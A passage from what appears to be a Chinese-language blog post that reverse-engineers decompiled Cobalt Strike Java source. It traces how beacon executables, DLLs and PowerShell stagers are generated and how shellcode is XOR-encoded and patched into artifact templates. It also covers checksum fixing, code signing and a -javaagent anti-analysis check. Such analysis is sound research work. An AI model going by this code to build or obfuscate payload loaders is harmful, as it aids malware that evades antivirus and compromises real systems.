class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"生成64位exe 程序"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span><span class="token string">"windows64stager.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64svcbig.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.x64.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildPowerShell</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32svcbig.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32big.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildPowerShell</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".exe"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Can only sign EXE and DLL files\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">DataUtils</span><span class="token punctuation">.</span><span class="token function">getSigner</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"Could not sign '"</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not sign the file\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token string">"Saved "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>执行结果:</p><pre class="language-shell" data-language="shell"><code class="language-shell">stageless 点击生成: beacon_x64.exe生成64位exe 程序写入: shellcode&#x2F;windows64stager.bin读取: artifact64big.exe写入: shellcode&#x2F;artifact64big.exe.bin写入: shellcode&#x2F;Patch加载器直接加载x64shellcode.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后还原.bin写入: shellcode&#x2F;artifact64big.exe填充A.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后2.bincall replaceAt!!!写入: shellcode&#x2F;Patchartifactx64shellcode亦或后3.binfix checksum!!!!写入: shellcode&#x2F;var1Nofixsum.binPEEditor fix checksum!!!!写入: shellcode&#x2F;fixchecsum.bin</code></pre><p>我们来分析一波 由于是exe<br>传入shellcode </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>src&#x2F;common&#x2F;BaseArtifactUtils.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Stack</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"EXECUTABLE_ARTIFACT_GENERATOR"</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var4 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">RuntimeMXBean</span> var0 <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getInputArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var3<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span>var3 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>var3<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-javaagent:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>调用patch函数 基本和stage过程一样就忽略了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">_patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"artifact32"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x86"</span> <span class="token operator">:</span> <span class="token string">"x64"</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token string">"resources/"</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取: "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact64big.exe</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">".bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"Patch加载器直接加载"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接使用loader加载</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("亦或的数字是: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//亦或加密后到内存还原解密加载shellcode</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> yihuohuanyuan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var7<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>yihuohuanyuan<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//还原</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>yihuohuanyuan<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后还原.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact32.exe 转换成字符串 artifact64big.exe</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//找里面的AAA</span><span class="token class-name">Packer</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var9 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> var6<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">hasLoaderHint</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetModuleHandleA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_trial</span><span class="token punctuation">(</span><span class="token string">"Added EICAR string to "</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token 